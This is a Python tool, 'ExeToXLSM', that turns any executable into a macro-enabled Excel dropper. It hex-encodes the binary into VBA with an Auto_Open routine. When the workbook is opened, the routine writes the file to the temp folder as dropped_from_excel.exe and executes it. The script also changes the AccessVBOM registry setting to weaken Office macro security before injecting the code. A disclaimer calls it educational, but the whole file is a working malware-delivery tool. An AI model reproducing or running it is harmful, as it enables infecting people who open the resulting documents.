#!/bin/python
# -*- coding: utf-8 -*-
#
# Author: OzoNeTT
# Date: 23.01.2022
#
# Description: This script uses to injects an executable file to EXCEL document.
#
# NOTICE: Use it only for educational purposes, do not distribute or use it for a malicious payload delivery
# to another users. Just for self-practicing!
#
# Usage: python exe-to-xlsm.py -i input.exe --xlsm dropper.xlsm
#
# Result will be saved to "./out" directory
#

import win32api
import win32con
import argparse
import os
import time
import sys
from openpyxl import Workbook, load_workbook
import win32com.client
import binascii

sys.coinit_flags = 0

os.system('mkdir out')
OUT_DIR = os.path.abspath('./out')

HEXDECODE = """Public Function HexDecode(sData As String) As String
    Dim iChar As Integer
    Dim sOutString As String
    Dim sTmpChar As String
    For iChar = 1 To Len(sData) Step 2
        sTmpChar = Chr("&H" & Mid(sData, iChar, 2))
        sOutString = sOutString & sTmpChar
    Next iChar
    HexDecode = sOutString
End Function


Private Sub Auto_Open()

"""

parser = argparse.ArgumentParser(description="-= ExeToXLSM v0.1 =-")
parser.add_argument("--xlsm", dest="xlsm", default=None, help="Insert VB script to xlsm", required=True)
parser.add_argument("-i", dest="input", help="Input file", required=True)


def process_macro(filename):
    text = open(filename, 'rb').read()
    macro = open(os.path.join(OUT_DIR, 'macros.txt'), 'w')

    macro.write(HEXDECODE)

    rowcount = math.ceil(len(text) / 500)
    macro.write("Dim codes(1 To " + str(rowcount) + ") As String\n")

    temp = ''
    for i in range(1, len(text)):
        temp += binascii.hexlify(text[(i - 1):i]).decode()
        if (i % 500) == 0:
            line = f'codes({math.ceil(i / 500)})="{temp}"\n'
            macro.write(line)
            temp = ''
    if temp != '':
        line = f'codes({rowcount})="{temp}00"\n'
        macro.write(line)

    macro.write(f'\ncode = ""\n')
    macro.write(f'For i = 1 To {str(rowcount)}\n')
    macro.write('    code = code + codes(i)\n')
    macro.write('Next\n\n')
    macro.write('fnum = FreeFile\n')
    macro.write('fname = Environ("TMP") & "\\dropped_from_excel.exe"\n')
    macro.write('Open fname For Binary As #fnum\n')
    macro.write(f'    For t = 1 To {str(rowcount * 1000)} Step 4\n')
    macro.write('        vv = Mid(code, t, 4)\n')
    macro.write('        Put #fnum, , HexDecode(CStr(vv))\n')
    macro.write('    Next t\n')
    macro.write('Close #fnum\n\n')
    macro.write('Dim rss\n')
    macro.write('rss = Shell(fname, 1)\n\n')
    macro.write('End Sub\n\n')

    macro.close()


def create_xlsm(file):
    wb = Workbook()
    ws = wb.active
    wb.save(file)
    wb = load_workbook(file, keep_vba=True)
    wb.save(file)


def add_regkey():
    key = win32api.RegOpenKeyEx(win32con.HKEY_CURRENT_USER,
                                "Software\\Microsoft\\Office\\16.0\\Excel"
                                + "\\Security", 0, win32con.KEY_ALL_ACCESS)
    win32api.RegSetValueEx(key, "AccessVBOM", 0, win32con.REG_DWORD, 1)


def include_xlsm(file):
    print(f'{"Creating file...":32}', end='')
    try:
        create_xlsm(file)
    except Exception:
        print(f'[FAILED]')
        exit(1)
    print(f'[DONE]')
    time.sleep(1)

    print(f'{"Adding regkey...":32}', end='')
    try:
        add_regkey()
    except Exception:
        print(f'[FAILED]')
    print(f'[DONE]')

    with open(os.path.join(OUT_DIR, 'macros.txt'), 'r', encoding="latin-1") as macro_file:
        macro = macro_file.read()

    com_instance = None
    objworkbook = None
    xlmodule = None
    print(f'{"Initializing EXCEL...":32}', end='')
    try:
        com_instance = win32com.client.Dispatch("Excel.Application")  # USING WIN32COM
        com_instance.Visible = False
        time.sleep(10)
    except Exception:
        print(f'[FAILED]')
        com_instance.Quit()
        exit(1)
    print(f'[DONE]')

    print(f'{"Opening workbook...":32}', end='')
    try:
        objworkbook = com_instance.Workbooks.Open(file)
        time.sleep(10)
    except Exception:
        print(f'[FAILED]')
        com_instance.Quit()
        exit(1)
    print(f'[DONE]')


    print(f'{"Creating VBProject...":32}', end='')
    try:
        xlmodule = objworkbook.VBProject.VBComponents.Add(1)
    except Exception:
        print(f'[FAILED]')
        com_instance.Quit()
        exit(1)
    print(f'[DONE]')

    print(f'{"Adding VBScript...":32}', end='')
    try:
        xlmodule.CodeModule.AddFromString(macro.strip())
        time.sleep(30)
    except Exception:
        print(f'[FAILED]')
        com_instance.Quit()
        exit(1)
    print(f'[DONE]')

    com_instance.DisplayAlerts = False

    print(f'{"Saving Dropper...":32}', end='')
    try:
        objworkbook.SaveAs(file, None, '', '')
        time.sleep(10)
    except Exception:
        print(f'[FAILED]')
        com_instance.Quit()
        exit(1)
    print(f'[DONE]')

    com_instance.Quit()


def processing(args):
    print(f'-= ExeToXLSM v0.1 =-\n')

    if args.xlsm and args.input:
        if args.xlsm == '':
            print('Enter xlsm filename (Example: document.xlsm')
            exit(1)
        if args.xlsm.split('.')[-1] != 'xlsm':
            args.xlsm += '.xlsm'

        print(f'Start EXE to XLSM...\n')

        print(f'{"Creating VBA script...":32}', end='')
        try:
            process_macro(args.input)
        except Exception:
            print('Error occurred while creating VBA macros!')
            exit(1)

        print(f'[DONE]\n')
        print(f'Inserting VBA script to XLSM:')
        try:
            include_xlsm(os.path.join(OUT_DIR, args.xlsm))
        except Exception:
            print('\nError occurred while creating XLSM!')
            os.remove(os.path.join(OUT_DIR, 'macros.txt'))
            exit(1)
        print(f'\nXLSM successfully been created to out\\{args.xlsm}\n')
        os.remove(os.path.join(OUT_DIR, "macros.txt"))

    print(f'\n[FINISHED]\n')


if __name__ == '__main__':
    processing(parser.parse_args())
    exit(0)
